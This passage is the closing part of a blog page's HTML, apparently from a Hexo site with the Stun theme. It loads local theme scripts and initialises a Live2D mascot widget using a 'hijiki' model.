src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>